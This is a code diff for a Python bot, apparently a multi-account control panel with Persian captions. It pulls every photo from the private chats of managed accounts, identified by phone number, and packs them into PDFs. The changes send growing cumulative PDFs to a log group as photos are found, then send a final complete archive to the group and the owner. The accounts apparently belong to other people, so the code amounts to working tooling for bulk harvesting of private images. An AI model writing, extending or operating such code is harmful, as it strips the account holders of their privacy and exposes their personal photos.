@@ -3756,9 +3756,10 @@ async def pvexport_run_cb(event):
     asyncio.create_task(run_pv_export(event.sender_id, acc))
 
 
-async def _pv_collect_photos(acc) -> list:
+async def _pv_collect_photos(acc, on_batch=None) -> list:
     """Return a list of raw image byte-blobs from the account's PV chats.
-    Local: download directly. Worker: ask worker, decode base64."""
+    Local: download directly (and call on_batch(list_so_far) every
+    PV_GROUP_BATCH photos for LIVE cumulative sending). Worker: ask worker."""
     w = worker.worker_for_account(acc)
     if w and not worker.is_local(w):
         import base64
@@ -3769,6 +3770,8 @@ async def _pv_collect_photos(acc) -> list:
             raise RuntimeError(res.get("error", "pvexport failed"))
         return [base64.b64decode(x) for x in (res.get("photos_b64") or [])]
 
+    batch = max(1, int(config.PV_GROUP_BATCH))
+
     async def _do(client):
         out = []
         guids = await rb.get_chat_list_guids(client, only_users=True)
@@ -3778,12 +3781,12 @@ async def _pv_collect_photos(acc) -> list:
                     blob = await rb.download_photo(client, fi)
                     if blob:
                         out.append(blob)
-                        # LIVE progress: every PV_GROUP_BATCH photos found -> log
-                        if config.PV_GROUP_BATCH > 0 and len(out) % config.PV_GROUP_BATCH == 0:
-                            await log(card("📸 جمع‌آوری عکس (زنده)", [
-                                f"📱 {acc['phone']}",
-                                f"🖼 تا الان پیدا شد : {len(out)}",
-                                f"🕒 {now()}"]))
+                        # LIVE cumulative: every `batch` photos -> send all so far
+                        if on_batch is not None and len(out) % batch == 0:
+                            try:
+                                await on_batch(list(out))
+                            except Exception:
+                                pass
                 except Exception:
                     continue
                 if len(out) >= config.PV_EXPORT_MAX_PHOTOS:
@@ -3792,10 +3795,45 @@ async def _pv_collect_photos(acc) -> list:
     return await account_conn.call(acc["phone"], _do, timeout=1800)
 
 
+async def _pv_build_and_send(phone, photos, final=False):
+    """Build a PDF of ALL `photos` so far and send it to the LOG GROUP.
+    Cumulative: each call includes everything collected up to now."""
+    import pdf_export
+    path = os.path.join(
+        DATA_DIR, f"pv_{phone}_{len(photos)}_{int(datetime.now().timestamp())}.pdf")
+    try:
+        n = await asyncio.to_thread(pdf_export.build_pdf, photos, path)
+        cap = card(
+            "🖼 آرشیو عکس پیوی — فایل نهایی کامل ✅" if final
+            else "🖼 آرشیو عکس پیوی (تجمعی زنده)", [
+                f"📱 {phone}",
+                f"🖼 عکس‌های این فایل (تجمعی) : {n}",
+                ("🏁 پایان" if final else "⏳ ادامه دارد ..."),
+                f"🕒 {now()}"])
+        await bot.send_file(config.LOG_GROUP_ID, path, caption=cap, force_document=True)
+        return n
+    finally:
+        try:
+            os.remove(path)
+        except Exception:
+            pass
+
+
 async def run_pv_export(owner_id: int, acc):
     phone = acc["phone"]
+    batch = max(1, int(config.PV_GROUP_BATCH))
+    last_sent = {"n": 0}
+
+    # LIVE cumulative: every `batch` photos found -> send a PDF of EVERYTHING
+    # collected so far (20, then 40, then 60, ... growing) to the log group.
+    async def on_batch(photos_so_far):
+        await log(card("📸 جمع‌آوری زنده", [
+            f"📱 {phone}", f"🖼 تا الان پیدا شد : {len(photos_so_far)}", f"🕒 {now()}"]))
+        await _pv_build_and_send(phone, list(photos_so_far), final=False)
+        last_sent["n"] = len(photos_so_far)
+
     try:
-        photos = await _pv_collect_photos(acc)
+        photos = await _pv_collect_photos(acc, on_batch=on_batch)
     except account_conn.InvalidAuthError:
         await _log_invalid_auth(phone)
         return
@@ -3813,64 +3851,47 @@ async def run_pv_export(owner_id: int, acc):
                                buttons=main_menu(owner_id == config.OWNER_ID))
         return
 
-    import pdf_export
-    # ---- update_end #7: send the photos to the LOG GROUP cumulatively in
-    # batches of PV_GROUP_BATCH (Goao style), then a final "پایان" card. ----
-    batch = max(1, int(config.PV_GROUP_BATCH))
     total_photos = len(photos)
-    sent_group = 0
-    batch_no = 0
-    try:
-        for i in range(0, total_photos, batch):
-            chunk = photos[i:i + batch]
-            batch_no += 1
-            chunk_path = os.path.join(
-                DATA_DIR, f"pv_{phone}_b{batch_no}_{int(datetime.now().timestamp())}.pdf")
-            try:
-                cn = await asyncio.to_thread(pdf_export.build_pdf, chunk, chunk_path)
-                sent_group += cn
-                await bot.send_file(
-                    config.LOG_GROUP_ID, chunk_path,
-                    caption=card("🖼 آرشیو عکس پیوی (تجمعی)", [
-                        f"👤 {phone}",
-                        f"📦 دسته {batch_no} — {cn} عکس",
-                        f"📊 تا اینجا : {sent_group} از {total_photos}",
-                        f"🕒 {now()}"]),
-                    force_document=True)
-            except Exception as e:  # noqa: BLE001
-                await log(card("⚠️ آرشیو عکس — خطای دسته", [
-                    f"👤 {phone}", f"📦 دسته {batch_no}", f"💥 {repr(e)[:140]}"]))
-            finally:
-                try:
-                    os.remove(chunk_path)
-                except Exception:
-                    pass
-        # final "پایان" card to the group
-        await log(card("🏁 آرشیو عکس پیوی — پایان", [
-            f"👤 {phone}",
-            f"🖼 مجموع عکس‌ها : {total_photos}",
-            f"📦 دسته‌ها : {batch_no} (هر دسته تا {batch} عکس)",
-            f"🕒 {now()}"]))
-    except Exception as e:  # noqa: BLE001
-        await log(card("⚠️ آرشیو عکس — خطا", [f"👤 {phone}", f"💥 {repr(e)[:160]}"]))
 
-    # also send ONE full PDF to the owner (existing behaviour, unchanged).
+    # Remote accounts return all photos at once (no live stream), so do the
+    # cumulative growing sends here: 20, 40, 60, ... to the group.
+    w = worker.worker_for_account(acc)
+    if w and not worker.is_local(w):
+        i = batch
+        while i < total_photos:
+            await log(card("📸 جمع‌آوری", [
+                f"📱 {phone}", f"🖼 تا الان : {i} از {total_photos}", f"🕒 {now()}"]))
+            await _pv_build_and_send(phone, photos[:i], final=False)
+            i += batch
+        last_sent["n"] = min(i, total_photos)
+
+    # FINAL complete one-piece file (ALL photos) to the group.
+    try:
+        n_final = await _pv_build_and_send(phone, photos, final=True)
+    except Exception as e:  # noqa: BLE001
+        await log(card("⚠️ آرشیو عکس — خطای فایل نهایی", [f"👤 {phone}", f"💥 {repr(e)[:140]}"]))
+        n_final = total_photos
+
+    # final "پایان" summary card to the group
+    await log(card("🏁 آرشیو عکس پیوی — پایان", [
+        f"👤 {phone}",
+        f"🖼 مجموع عکس‌ها : {total_photos}",
+        f"📄 فایل نهایی کامل ارسال شد ({n_final} عکس)",
+        f"🕒 {now()}"]))
+
+    # also send the full one-piece PDF to the owner.
+    import pdf_export
     out_path = os.path.join(DATA_DIR, f"pv_{phone}_{int(datetime.now().timestamp())}.pdf")
     try:
         n = await asyncio.to_thread(pdf_export.build_pdf, photos, out_path)
     except Exception as e:  # noqa: BLE001
-        await bot.send_message(owner_id, f"❌ ساخت PDF ناموفق: {repr(e)[:120]}")
+        await bot.send_message(owner_id, f"❌ ساخت PDF نهایی ناموفق: {repr(e)[:120]}")
         return
-
-    await log(card("🖼 آرشیو عکس پیوی ✅", [
-        f"👤 {phone}",
-        f"🖼 تعداد عکس : {n}",
-        f"🕒 {now()}"]))
     try:
         await bot.send_file(owner_id, out_path,
-                            caption=f"🖼 آرشیو عکس‌های پیویِ {phone}\nتعداد: {n} عکس",
+                            caption=f"🖼 آرشیو کامل عکس‌های پیویِ {phone}\nتعداد: {n} عکس",
                             force_document=True)
-        await bot.send_message(owner_id, "✅ آرشیو ارسال شد.",
+        await bot.send_message(owner_id, "✅ آرشیو کامل ارسال شد.",
                                buttons=main_menu(owner_id == config.OWNER_ID))
     finally:
         try:
